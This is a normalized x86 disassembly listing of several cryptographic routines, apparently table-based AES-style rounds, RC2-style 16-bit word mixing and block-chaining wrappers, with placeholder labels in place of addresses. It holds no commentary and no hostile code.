mov [ esp + 0x20 ] ecx
or esi eax
mov eax [ edi + 0x4 ]
xor esi eax
mov eax edx
ror eax 0x8
and eax 0xff00ff00
mov [ esp + 0x14 ] esi
rol edx 0x8
and edx 0xff00ff
or eax edx
mov edx [ edi + 0x8 ]
xor eax edx
mov edx ebx
ror edx 0x8
and edx 0xff00ff00
mov [ esp + 0x18 ] eax
rol ebx 0x8
and ebx 0xff00ff
or edx ebx
mov ebx [ edi + 0xc ]
xor edx ebx
xor ebx ebx
mov [ esp + 0x28 ] edx
xor edx edx
mov dl [ esp + 0x2a ]
mov bl ah
mov edx [ edx * 4 + r--data ]
mov eax [ ebx * 4 + r--data ]
xor edx eax
mov eax ecx
shr eax 0x18
mov ebx [ eax * 4 + r--data ]
mov eax esi
and eax 0xff
xor edx ebx
shr esi 0x18
mov ebx [ eax * 4 + r--data ]
mov eax [ edi + 0x10 ]
xor edx ebx
xor ebx ebx
mov bl [ esp + 0x22 ]
xor edx eax
xor eax eax
mov [ esp + 0x1c ] edx
mov al [ esp + 0x29 ]
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esi * 4 + r--data ]
mov esi [ esp + 0x18 ]
mov eax [ eax * 4 + r--data ]
and esi 0xff
xor eax ebp
xor eax ebx
mov ebx [ esi * 4 + r--data ]
mov esi [ edi + 0x14 ]
xor eax ebx
xor eax esi
xor ebx ebx
mov [ esp + 0x10 ] eax
xor eax eax
mov al [ esp + 0x16 ]
mov bl ch
mov ecx [ esp + 0x18 ]
mov eax [ eax * 4 + r--data ]
mov ebp [ ebx * 4 + r--data ]
shr ecx 0x18
xor eax ebp
mov ebp [ ecx * 4 + r--data ]
mov ecx [ esp + 0x28 ]
and ecx 0xff
xor eax ebp
mov ebp [ edi + 0x18 ]
mov esi [ ecx * 4 + r--data ]
xor ecx ecx
mov cl [ esp + 0x15 ]
xor eax esi
xor eax ebp
mov ebx [ ecx * 4 + r--data ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x30 ] eax
xor eax eax
mov al [ esp + 0x1a ]
shr ecx 0x18
mov eax [ eax * 4 + r--data ]
mov ebp [ ecx * 4 + r--data ]
mov ecx [ esp + 0x20 ]
and ecx 0xff
xor eax ebx
xor eax ebp
mov ebp [ edi + 0x1c ]
mov esi [ ecx * 4 + r--data ]
xor eax esi
lea esi [ edi + 0x20 ]
mov edi [ edi + 0xf0 ]
xor eax ebp
sar edi 0x1
dec edi
mov [ esp + 0x28 ] eax
je r-xdata
xor ecx ecx
xor ebx ebx
mov cl [ esp + 0x2a ]
mov ebp [ esp + 0x2c ]
mov bl [ ecx + r--data ]
mov ecx edx
shr ecx 0x18
mov edi ebx
xor ebx ebx
mov bh [ ecx + r--data ]
xor ecx ecx
mov cl [ esp + 0x31 ]
xor edi ebx
xor ebx ebx
mov bl [ ecx + r--data ]
mov ecx [ esp + 0x10 ]
shl edi 0x8
xor edi ebx
and ecx 0xff
xor ebx ebx
mov bl [ ecx + r--data ]
mov ecx [ esi ]
shl edi 0x8
xor edi ebx
xor ebx ebx
xor edi ecx
mov ecx edi
ror ecx 0x8
and ecx 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or ecx edi
mov [ ebp ] ecx
xor ecx ecx
mov cl [ esp + 0x1e ]
mov bl [ ecx + r--data ]
mov ecx [ esp + 0x10 ]
mov edi ebx
xor ebx ebx
shr ecx 0x18
mov bh [ ecx + r--data ]
xor ecx ecx
xor edi ebx
mov cl ah
xor ebx ebx
mov bl [ ecx + r--data ]
mov ecx [ esp + 0x30 ]
shl edi 0x8
xor edi ebx
and ecx 0xff
xor ebx ebx
mov bl [ ecx + r--data ]
mov ecx [ esi + 0x4 ]
shl edi 0x8
xor edi ebx
xor ebx ebx
xor edi ecx
mov ecx edi
ror ecx 0x8
and ecx 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or ecx edi
mov [ ebp + 0x4 ] ecx
xor ecx ecx
mov cl [ esp + 0x12 ]
mov bl [ ecx + r--data ]
mov ecx [ esp + 0x30 ]
mov edi ebx
xor ebx ebx
shr ecx 0x18
mov bh [ ecx + r--data ]
xor ecx ecx
xor edi ebx
mov cl dh
xor ebx ebx
mov bl [ ecx + r--data ]
mov ecx eax
shl edi 0x8
xor edi ebx
shl edi 0x8
and ecx 0xff
xor ebx ebx
shr eax 0x18
mov bl [ ecx + r--data ]
mov ecx [ esi + 0x8 ]
xor edi ebx
xor ebx ebx
xor edi ecx
and edx 0xff
mov ecx edi
ror ecx 0x8
and ecx 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or ecx edi
mov [ ebp + 0x8 ] ecx
xor ecx ecx
mov cl [ esp + 0x32 ]
mov bl [ ecx + r--data ]
xor ecx ecx
mov ch [ eax + r--data ]
mov edi ebx
xor eax eax
xor edi ecx
mov al [ esp + 0x11 ]
xor ecx ecx
shl edi 0x8
mov cl [ eax + r--data ]
xor eax eax
mov al [ edx + r--data ]
xor edi ecx
mov ecx [ esi + 0xc ]
shl edi 0x8
xor edi eax
xor edi ecx
mov ecx edi
ror ecx 0x8
and ecx 0xff00ff00
rol edi 0x8
and edi 0xff00ff
or ecx edi
pop edi
mov [ ebp + 0xc ] ecx
pop esi
pop ebp
pop ebx
add esp 0x14
retn
xor ecx ecx
xor eax eax
mov cl [ esp + 0x31 ]
mov al [ esp + 0x2a ]
mov ebx [ ecx * 4 + r--data ]
mov eax [ eax * 4 + r--data ]
mov ecx edx
xor eax ebx
shr ecx 0x18
mov ebx [ ecx * 4 + r--data ]
mov ecx [ esp + 0x10 ]
and ecx 0xff
xor eax ebx
mov ebx [ ecx * 4 + r--data ]
mov ecx [ esi ]
xor eax ebx
xor ebx ebx
mov bl [ esp + 0x1e ]
xor eax ecx
xor ecx ecx
mov [ esp + 0x20 ] eax
mov cl [ esp + 0x29 ]
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esp + 0x10 ]
mov ecx [ ecx * 4 + r--data ]
shr ebx 0x18
xor ecx ebp
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esp + 0x30 ]
and ebx 0xff
xor ecx ebp
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esi + 0x4 ]
xor ecx ebp
mov ebp [ esi + 0x8 ]
xor ecx ebx
xor ebx ebx
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov cl [ esp + 0x12 ]
mov bl dh
mov ecx [ ecx * 4 + r--data ]
mov edx [ ebx * 4 + r--data ]
xor ecx edx
mov edx [ esp + 0x30 ]
shr edx 0x18
mov ebx [ edx * 4 + r--data ]
mov edx [ esp + 0x28 ]
and edx 0xff
xor ecx ebx
mov ebx [ edx * 4 + r--data ]
xor edx edx
mov dl [ esp + 0x11 ]
xor ecx ebx
xor ecx ebp
mov ebx [ edx * 4 + r--data ]
mov edx [ esp + 0x28 ]
mov [ esp + 0x18 ] ecx
xor ecx ecx
mov cl [ esp + 0x32 ]
shr edx 0x18
mov ecx [ ecx * 4 + r--data ]
xor ecx ebx
mov ebx [ edx * 4 + r--data ]
mov edx [ esp + 0x1c ]
xor ecx ebx
and edx 0xff
mov ebx [ edx * 4 + r--data ]
mov edx [ esi + 0xc ]
xor ecx ebx
xor ebx ebx
xor ecx edx
xor edx edx
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x18 ]
mov dl [ esp + 0x2a ]
mov bl ch
mov edx [ edx * 4 + r--data ]
mov ebp [ ebx * 4 + r--data ]
xor edx ebp
mov ebx eax
shr ebx 0x18
add esi 0x20
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esp + 0x14 ]
and ebx 0xff
xor edx ebp
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esi - 0x10 ]
xor edx ebp
xor edx ebx
xor ebx ebx
mov bl [ esp + 0x22 ]
mov [ esp + 0x1c ] edx
xor edx edx
mov dl [ esp + 0x29 ]
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esp + 0x14 ]
mov edx [ edx * 4 + r--data ]
shr ebx 0x18
xor edx ebp
mov ebp [ ebx * 4 + r--data ]
mov ebx ecx
and ebx 0xff
xor edx ebp
shr ecx 0x18
mov ebp [ ebx * 4 + r--data ]
mov ebx [ esi - 0xc ]
xor edx ebp
xor edx ebx
xor ebx ebx
mov [ esp + 0x10 ] edx
xor edx edx
mov dl [ esp + 0x16 ]
mov bl ah
and eax 0xff
mov ebp [ ebx * 4 + r--data ]
mov ebx [ ecx * 4 + r--data ]
mov edx [ edx * 4 + r--data ]
mov ecx [ esp + 0x28 ]
xor edx ebp
mov ebp [ esi - 0x8 ]
and ecx 0xff
xor edx ebx
mov ebx [ ecx * 4 + r--data ]
xor ecx ecx
mov cl [ esp + 0x15 ]
xor edx ebx
xor edx ebp
mov ebp [ eax * 4 + r--data ]
mov ebx [ ecx * 4 + r--data ]
mov ecx [ esp + 0x28 ]
mov [ esp + 0x30 ] edx
xor edx edx
mov dl [ esp + 0x1a ]
shr ecx 0x18
mov edx [ edx * 4 + r--data ]
xor edx ebx
mov ebx [ ecx * 4 + r--data ]
xor edx ebx
mov ebx [ esi - 0x4 ]
xor edx ebp
xor edx ebx
dec edi
mov eax edx
mov edx [ esp + 0x1c ]
mov [ esp + 0x28 ] eax
jne r-xdata
sub_10042830
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x20 ]
push ebx
push ebp
push esi
test eax eax
push edi
je r-xdata
mov ebp [ esp + 0x2c ]
xor ebx ebx
xor eax eax
xor ecx ecx
mov bl [ ebp ]
mov ah [ ebp + 0x1 ]
inc ebp
or ebx eax
inc ebp
xor edx edx
xor eax eax
mov cl [ ebp ]
mov dl [ ebp + 0x1 ]
shl ecx 0x10
or ebx ecx
inc ebp
shl edx 0x18
mov al [ ebp + 0x1 ]
or ebx edx
inc ebp
xor ecx ecx
inc ebp
xor edx edx
mov ch [ ebp ]
mov dl [ ebp + 0x1 ]
or eax ecx
inc ebp
shl edx 0x10
or eax edx
mov edx [ esp + 0x24 ]
inc ebp
xor ecx ecx
mov cl [ ebp ]
sub ebp 0x7
shl ecx 0x18
or eax ecx
lea ecx [ edx - 0x8 ]
test ecx ecx
mov [ esp + 0x2c ] eax
mov [ esp + 0x24 ] ecx
jl r-xdata
mov ebx [ esp + 0x2c ]
xor ecx ecx
xor eax eax
xor edx edx
mov cl [ ebx ]
mov ah [ ebx + 0x1 ]
inc ebx
or ecx eax
inc ebx
xor eax eax
mov dl [ ebx ]
mov al [ ebx + 0x1 ]
shl edx 0x10
or ecx edx
inc ebx
shl eax 0x18
or ecx eax
inc ebx
xor eax eax
xor edx edx
mov al [ ebx ]
mov dh [ ebx + 0x1 ]
inc ebx
or eax edx
inc ebx
xor edx edx
mov dl [ ebx ]
shl edx 0x10
or eax edx
inc ebx
xor edx edx
mov dl [ ebx ]
sub ebx 0x7
shl edx 0x18
or eax edx
mov edx [ esp + 0x24 ]
add edx 0xfffffff8
mov [ esp + 0x2c ] eax
test edx edx
jl r-xdata
mov edi [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
jmp r-xdata
lea eax [ ecx + 0x8 ]
mov edi [ esp + 0x20 ]
shr eax 0x3
mov esi [ esp + 0x1c ]
mov [ esp + 0x30 ] eax
neg eax
lea eax [ ecx + eax * 8 ]
mov [ esp + 0x24 ] eax
mov esi [ esp + 0x20 ]
mov edi [ esp + 0x1c ]
jmp r-xdata
lea eax [ edx + 0x8 ]
mov esi [ esp + 0x20 ]
shr eax 0x3
mov edi [ esp + 0x1c ]
mov [ esp + 0x30 ] eax
neg eax
lea eax [ edx + eax * 8 ]
mov [ esp + 0x24 ] eax
cmp ecx 0xfffffff8
je r-xdata
xor eax eax
xor ecx ecx
mov al [ esi ]
mov ch [ esi + 0x1 ]
inc esi
or eax ecx
inc esi
xor edx edx
xor ecx ecx
mov dl [ esi ]
mov cl [ esi + 0x1 ]
shl edx 0x10
or eax edx
inc esi
shl ecx 0x18
or eax ecx
inc esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] eax
xor eax eax
xor edx edx
mov al [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or eax edx
inc esi
xor ecx ecx
xor edx edx
mov cl [ esi ]
mov dl [ esi + 0x1 ]
shl ecx 0x10
or eax ecx
inc esi
shl edx 0x18
or eax edx
lea ecx [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x28 ]
inc esi
push eax
push ecx
call sub_10042f20
mov ecx [ esp + 0x18 ]
mov eax ebx
mov ebx [ esp + 0x1c ]
xor eax ecx
mov ecx [ esp + 0x34 ]
add esp 0x8
xor ecx ebx
mov [ edi ] al
mov edx eax
inc edi
shr edx 0x8
mov [ edi ] dl
mov edx eax
inc edi
mov ebx [ esp + 0x1c ]
shr edx 0x10
mov [ edi ] dl
inc edi
shr eax 0x18
mov [ edi ] al
inc edi
mov eax ecx
mov edx ecx
mov [ edi ] cl
inc edi
shr eax 0x8
mov [ edi ] al
mov eax [ esp + 0x20 ]
inc edi
mov [ esp + 0x2c ] eax
mov eax [ esp + 0x30 ]
shr edx 0x10
mov [ edi ] dl
inc edi
shr ecx 0x18
mov [ edi ] cl
inc edi
dec eax
mov [ esp + 0x30 ] eax
jne r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x24 ]
cmp edx 0xfffffff8
je r-xdata
xor eax eax
xor edx edx
mov al [ edi ]
mov dh [ edi + 0x1 ]
inc edi
or eax edx
inc edi
xor edx edx
mov dl [ edi ]
shl edx 0x10
or eax edx
inc edi
xor edx edx
mov dl [ edi ]
shl edx 0x18
or eax edx
inc edi
xor edx edx
xor eax ecx
mov dl [ edi ]
inc edi
mov ebp edx
xor edx edx
mov dh [ edi ]
mov [ esp + 0x10 ] eax
or ebp edx
inc edi
xor edx edx
mov eax [ esp + 0x28 ]
mov dl [ edi ]
lea ecx [ esp + 0x10 ]
shl edx 0x10
or ebp edx
inc edi
xor edx edx
push eax
mov dl [ edi ]
push ecx
shl edx 0x18
or ebp edx
mov edx [ esp + 0x34 ]
xor ebp edx
inc edi
mov [ esp + 0x1c ] ebp
call sub_10042dc0
mov eax [ esp + 0x18 ]
add esp 0x8
mov [ esi ] al
mov edx eax
inc esi
mov ecx eax
shr edx 0x8
mov [ esi ] dl
mov edx eax
inc esi
shr edx 0x10
mov [ esi ] dl
inc esi
shr eax 0x18
mov [ esi ] al
mov eax [ esp + 0x14 ]
inc esi
mov edx eax
shr edx 0x8
mov [ esi ] al
inc esi
mov [ esp + 0x2c ] eax
mov [ esi ] dl
mov edx eax
inc esi
shr edx 0x10
mov [ esi ] dl
inc esi
shr eax 0x18
mov [ esi ] al
mov eax [ esp + 0x30 ]
inc esi
dec eax
mov [ esp + 0x30 ] eax
jne r-xdata
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x2c ]
mov [ ebp ] bl
mov ecx ebx
inc ebp
mov edx ebx
shr ecx 0x8
mov [ ebp ] cl
inc ebp
shr edx 0x10
mov [ ebp ] dl
inc ebp
shr ebx 0x18
mov [ ebp ] bl
inc ebp
mov ecx eax
mov edx eax
mov [ ebp ] al
inc ebp
shr ecx 0x8
mov [ ebp ] cl
inc ebp
shr edx 0x10
shr eax 0x18
mov [ ebp ] dl
pop edi
mov [ ebp + 0x1 ] al
pop esi
pop ebp
pop ebx
add esp 0x8
retn
xor eax eax
xor ecx ecx
mov al [ esi ]
mov ch [ esi + 0x1 ]
inc esi
or eax ecx
inc esi
xor edx edx
xor ecx ecx
mov dl [ esi ]
mov cl [ esi + 0x1 ]
shl edx 0x10
or eax edx
inc esi
shl ecx 0x18
or eax ecx
inc esi
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] eax
xor eax eax
xor edx edx
mov al [ esi ]
mov dh [ esi + 0x1 ]
inc esi
or eax edx
inc esi
xor ecx ecx
mov edx [ esp + 0x28 ]
mov ch [ esi + 0x1 ]
push edx
mov cl [ esi ]
shl ecx 0x10
or eax ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x14 ]
push eax
call sub_10042f20
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x2c ]
mov esi [ esp + 0x1c ]
xor ebx eax
mov eax [ esp + 0x34 ]
lea edi [ edi + ecx + 0x8 ]
add ecx 0x7
add esp 0x8
xor eax esi
cmp ecx 0x7
ja r-xdata
mov [ ebx ] cl
mov edx ecx
inc ebx
pop edi
shr edx 0x8
mov [ ebx ] dl
mov edx ecx
inc ebx
pop esi
shr edx 0x10
mov [ ebx ] dl
inc ebx
shr ecx 0x18
mov [ ebx ] cl
inc ebx
mov ecx eax
mov edx eax
mov [ ebx ] al
inc ebx
shr ecx 0x8
mov [ ebx ] cl
inc ebx
shr edx 0x10
shr eax 0x18
mov [ ebx ] dl
mov [ ebx + 0x1 ] al
pop ebp
pop ebx
add esp 0x8
retn
lea edi [ edi + edx + 0x8 ]
add edx 0x7
mov [ esp + 0x1c ] edi
xor edi edi
xor ebp ebp
cmp edx 0x7
mov [ esp + 0x20 ] edi
ja r-xdata
mov edx [ esp + 0x20 ]
mov ebx [ esp + 0x1c ]
mov [ esp + 0x2c ] edx
mov eax edx
jmp [ ecx * 4 + jump_table_10042da0 ]
xor edi eax
mov eax [ esp + 0x28 ]
xor ebp ecx
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x18 ] ebp
mov [ esp + 0x1c ] edi
call sub_10042dc0
mov eax [ esp + 0x18 ]
add esp 0x8
mov [ esi ] al
mov edx eax
inc esi
mov ecx eax
shr edx 0x8
mov [ esi ] dl
mov edx eax
inc esi
shr edx 0x10
mov [ esi ] dl
inc esi
shr eax 0x18
mov [ esi ] al
mov eax [ esp + 0x14 ]
inc esi
mov edx eax
shr edx 0x8
mov [ esi ] al
inc esi
mov [ esp + 0x2c ] eax
mov [ esi ] dl
mov edx eax
inc esi
shr edx 0x10
shr eax 0x18
mov [ esi ] dl
mov [ esi + 0x1 ] al
mov eax [ esp + 0x2c ]
jmp [ edx * 4 + jump_table_10042d80 ]
mov ecx eax
dec edi
shr ecx 0x18
mov [ edi ] cl
mov edx eax
dec edi
shr edx 0x10
mov [ edi ] dl
mov ecx eax
dec edi
shr ecx 0x8
mov [ edi ] cl
dec edi
mov [ edi ] al
mov edx ebx
dec edi
shr edx 0x18
mov [ edi ] dl
mov eax ebx
dec edi
shr eax 0x10
mov [ edi ] al
mov ecx ebx
dec edi
shr ecx 0x8
mov [ edi ] cl
mov [ edi - 0x1 ] bl
mov ebp [ esp + 0x1c ]
xor edx edx
dec ebp
mov dl [ ebp ]
mov edi edx
xor edx edx
mov dl [ ebp - 0x1 ]
shl edi 0x18
dec ebp
shl edx 0x10
or edi edx
dec ebp
xor edx edx
mov dh [ ebp ]
or edi edx
dec ebp
xor edx edx
mov dl [ ebp ]
or edi edx
mov [ esp + 0x20 ] edi
jmp r-xdata
mov ebp [ esp + 0x1c ]
xor edx edx
dec ebp
mov dl [ ebp ]
shl edx 0x10
or edi edx
dec ebp
xor edx edx
mov dh [ ebp ]
or edi edx
dec ebp
xor edx edx
mov dl [ ebp ]
or edi edx
mov [ esp + 0x20 ] edi
jmp r-xdata
mov ebp [ esp + 0x1c ]
xor edx edx
dec ebp
mov dh [ ebp ]
or edi edx
dec ebp
xor edx edx
mov dl [ ebp ]
or edi edx
mov [ esp + 0x20 ] edi
jmp r-xdata
mov ebp [ esp + 0x1c ]
xor edx edx
dec ebp
mov dl [ ebp ]
or edi edx
mov [ esp + 0x20 ] edi
jmp r-xdata
mov ebp [ esp + 0x1c ]
mov edi [ esp + 0x1c ]
xor edx edx
dec edi
mov dl [ edi ]
shl edx 0x10
or ebp edx
dec edi
xor edx edx
mov dh [ edi ]
or ebp edx
jmp r-xdata
mov edi [ esp + 0x1c ]
xor edx edx
dec edi
mov dh [ edi ]
or ebp edx
jmp r-xdata
mov edi [ esp + 0x1c ]
dec ebp
xor edx edx
mov [ esp + 0x1c ] ebp
mov dl [ ebp ]
mov ebp edx
shl ebp 0x18
xor edx edx
mov dl [ edi - 0x1 ]
mov edi [ esp + 0x20 ]
or ebp edx
sub_10042dc0
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
push ebp
mov ebp [ esp + 0x18 ]
push esi
mov esi [ eax ]
push edi
mov edi [ eax + 0x4 ]
mov ecx esi
mov edx edi
and ecx 0xffff
and edx 0xffff
shr esi 0x10
shr edi 0x10
mov [ esp + 0x10 ] 0x3
mov [ esp + 0x14 ] 0x5
mov eax edi
mov ebx edi
not eax
and eax esi
and ebx edx
add eax ebx
mov ebx [ ebp ]
add eax ebx
mov ebx edi
add eax ecx
add ebp 0x4
and eax 0xffff
add ebp 0x4
mov ecx eax
add eax eax
shr ecx 0xf
or ecx eax
add ebp 0x4
mov eax ecx
and ebx ecx
not eax
and eax edx
add ebp 0x4
add eax ebx
mov ebx [ ebp - 0xc ]
add eax ebx
add eax esi
and eax 0xffff
mov esi eax
shr esi 0xe
shl eax 0x2
or esi eax
mov eax esi
mov ebx esi
not eax
and eax edi
and ebx ecx
add eax ebx
mov ebx [ ebp - 0x8 ]
add eax ebx
add eax edx
and eax 0xffff
mov edx eax
shr edx 0xd
shl eax 0x3
or edx eax
mov eax edx
mov ebx edx
not eax
and eax ecx
and ebx esi
add eax ebx
mov ebx [ ebp - 0x4 ]
add eax ebx
add eax edi
and eax 0xffff
mov edi eax
shr edi 0xb
shl eax 0x5
or edi eax
mov eax [ esp + 0x14 ]
dec eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov eax [ esp + 0x10 ]
dec eax
mov [ esp + 0x10 ] eax
je r-xdata
mov eax [ esp + 0x1c ]
and ecx 0xffff
shl esi 0x10
shl edi 0x10
and edx 0xffff
or esi ecx
or edi edx
mov [ eax ] esi
mov [ eax + 0x4 ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ebx [ esp + 0x10 ]
xor eax eax
cmp ebx 0x2
mov ebx edi
sete al
add eax 0x5
and ebx 0x3f
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x20 ]
add ecx [ eax + ebx * 4 ]
mov ebx ecx
and ebx 0x3f
add esi [ eax + ebx * 4 ]
mov ebx esi
and ebx 0x3f
add edx [ eax + ebx * 4 ]
mov ebx edx
and ebx 0x3f
add edi [ eax + ebx * 4 ]
jmp r-xdata
sub_10042f20
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0x14 ]
push ebp
push esi
mov esi [ eax + 0x4 ]
push edi
mov edi [ eax ]
mov ecx edi
mov eax esi
and ecx 0xffff
and eax 0xffff
shr edi 0x10
shr esi 0x10
mov [ esp + 0x10 ] 0x3
mov edx 0x5
lea ebp [ ebx + 0xfc ]
mov ebx esi
sub ebp 0x4
shl ebx 0xb
shr esi 0x5
or ebx esi
mov esi eax
not esi
and esi ecx
sub ebp 0x4
sub ebx esi
mov esi eax
and esi edi
sub ebp 0x4
sub ebx esi
mov esi [ ebp + 0xc ]
sub ebx esi
sub ebp 0x4
and ebx 0xffff
mov esi ebx
mov ebx eax
shl ebx 0xd
shr eax 0x3
or ebx eax
mov eax edi
not eax
and eax esi
sub ebx eax
mov eax edi
and eax ecx
sub ebx eax
mov eax [ ebp + 0xc ]
sub ebx eax
and ebx 0xffff
mov eax ebx
mov ebx edi
shl ebx 0xe
shr edi 0x2
or ebx edi
mov edi ecx
not edi
and edi eax
sub ebx edi
mov edi esi
and edi ecx
sub ebx edi
mov edi [ ebp + 0x8 ]
sub ebx edi
and ebx 0xffff
mov edi ebx
mov ebx ecx
shl ebx 0xf
shr ecx 0x1
or ebx ecx
mov ecx esi
not ecx
and ecx edi
sub ebx ecx
mov ecx esi
and ecx eax
sub ebx ecx
mov ecx [ ebp + 0x4 ]
sub ebx ecx
and ebx 0xffff
dec edx
mov ecx ebx
jne r-xdata
mov edx [ esp + 0x10 ]
dec edx
mov [ esp + 0x10 ] edx
je r-xdata
shl edi 0x10
and ecx 0xffff
and eax 0xffff
or edi ecx
mov ecx [ esp + 0x1c ]
shl esi 0x10
or esi eax
mov [ ecx ] edi
mov [ ecx + 0x4 ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov ebx [ esp + 0x10 ]
xor edx edx
cmp ebx 0x2
mov ebx eax
sete dl
add edx 0x5
and ebx 0x3f
mov [ esp + 0x14 ] edx
mov edx [ esp + 0x20 ]
sub esi [ edx + ebx * 4 ]
mov ebx edi
and ebx 0x3f
and esi 0xffff
sub eax [ edx + ebx * 4 ]
mov ebx ecx
and ebx 0x3f
and eax 0xffff
sub edi [ edx + ebx * 4 ]
mov ebx esi
and ebx 0x3f
and edi 0xffff
sub ecx [ edx + ebx * 4 ]
mov edx [ esp + 0x14 ]
and ecx 0xffff
jmp r-xdata
sub_100430a0
mov eax 0x8
call sub_1001d0d0
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x24 ]
push ebx
push ebp
push esi
mov esi [ edx ]
test eax eax
mov eax [ esp + 0x20 ]
push edi
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edi [ esp + 0x2c ]
mov ebx [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
mov edi [ esp + 0x2c ]
mov ebx [ esp + 0x1c ]
mov [ esp + 0x24 ] eax
mov al [ ebx ]
mov cl [ esi + edi ]
mov [ esi + edi ] al
xor al cl
mov ecx [ esp + 0x20 ]
inc ebx
mov [ ecx ] al
mov eax [ esp + 0x24 ]
inc ecx
inc esi
and esi 0x7
dec eax
mov [ esp + 0x20 ] ecx
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ eax ]
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
mov eax [ esp + 0x28 ]
shl edx 0x10
or edx ecx
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x1c ] edx
call sub_10042dc0
mov ecx [ esp + 0x18 ]
mov eax ebp
mov edx ecx
mov [ edi ] cl
shr edx 0x8
mov [ eax ] dl
add esp 0x8
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov edx [ esp + 0x30 ]
mov [ eax + 0x1 ] cl
mov al [ ebx ]
mov cl [ esi + edi ]
xor al cl
mov ecx [ esp + 0x20 ]
inc ebx
mov [ ecx ] al
inc ecx
mov [ esi + edi ] al
mov eax [ esp + 0x24 ]
inc esi
mov [ esp + 0x20 ] ecx
and esi 0x7
dec eax
mov [ esp + 0x24 ] eax
jne r-xdata
lea ebp [ edi + 0x1 ]
xor ecx ecx
mov cl [ edi ]
mov eax ebp
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ eax ]
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
mov eax [ esp + 0x28 ]
shl edx 0x10
or edx ecx
lea ecx [ esp + 0x10 ]
push eax
push ecx
mov [ esp + 0x1c ] edx
call sub_10042dc0
mov ecx [ esp + 0x18 ]
mov eax ebp
mov edx ecx
mov [ edi ] cl
shr edx 0x8
mov [ eax ] dl
add esp 0x8
mov edx ecx
inc eax
shr edx 0x10
mov [ eax ] dl
inc eax
shr ecx 0x18
mov [ eax ] cl
mov ecx [ esp + 0x14 ]
inc eax
mov edx ecx
shr edx 0x8
mov [ eax ] cl
inc eax
mov [ eax ] dl
mov edx ecx
inc eax
shr edx 0x10
shr ecx 0x18
mov [ eax ] dl
mov edx [ esp + 0x30 ]
mov [ eax + 0x1 ] cl
test esi esi
jne r-xdata
test esi esi
jne r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
sub_10043290
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0xc ]
xor ecx ecx
xor edx edx
mov cl [ eax ]
mov dh [ eax + 0x1 ]
inc eax
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x10
or ecx edx
inc eax
xor edx edx
mov dl [ eax ]
shl edx 0x18
or ecx edx
inc eax
mov [ esp ] ecx
xor ecx ecx
mov cl [ eax ]
inc eax
xor edx edx
mov dh [ eax ]
or ecx edx
inc eax
xor edx edx
mov dh [ eax + 0x1 ]
mov dl [ eax ]
mov eax [ esp + 0x18 ]
shl edx 0x10
or edx ecx
test eax eax
mov [ esp + 0x4 ] edx
je r-xdata
mov edx [ esp + 0x14 ]
lea eax [ esp ]
push edx
push eax
call sub_10042f20
mov eax [ esp + 0x14 ]
lea ecx [ esp ]
push eax
push ecx
call sub_10042dc0
jmp r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x8 ]
add esp 0x8
mov edx ecx
mov [ eax ] cl
inc eax
shr edx 0x8
mov [ eax ] dl
